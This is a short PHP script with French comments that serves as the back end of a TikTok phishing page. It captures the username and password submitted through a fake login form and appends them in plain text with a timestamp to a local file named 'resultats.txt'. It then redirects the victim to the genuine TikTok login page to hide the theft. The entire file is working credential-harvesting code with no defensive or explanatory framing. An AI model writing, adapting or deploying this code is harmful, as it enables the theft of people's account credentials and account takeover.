<?php
// Vérifie si les données ont été envoyées via le formulaire
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // 1. On récupère les données saisies
    $identifiant = $_POST['identifiant'];
    $motdepasse = $_POST['motdepasse'];

    // 2. On prépare le texte à enregistrer
    $donnees = "--- Nouvelle Connexion ---\n";
    $donnees .= "Utilisateur : " . $identifiant . "\n";
    $donnees .= "Mot de passe : " . $motdepasse . "\n";
    $donnees .= "Date : " . date('d-m-Y H:i:s') . "\n";
    $donnees .= "---------------------------\n\n";

    // 3. On enregistre dans un fichier appelé 'resultats.txt'
    // FILE_APPEND permet d'ajouter les nouveaux textes à la suite des anciens
    file_put_contents("resultats.txt", $donnees, FILE_APPEND);

    // 4. Redirection vers le vrai site TikTok
    header("Location: https://www.tiktok.com/login");
    exit();
} else {
    // Si quelqu'un essaie d'accéder au fichier PHP directement, on le renvoie au formulaire
    header("Location: index.php");
    exit();
}
?>
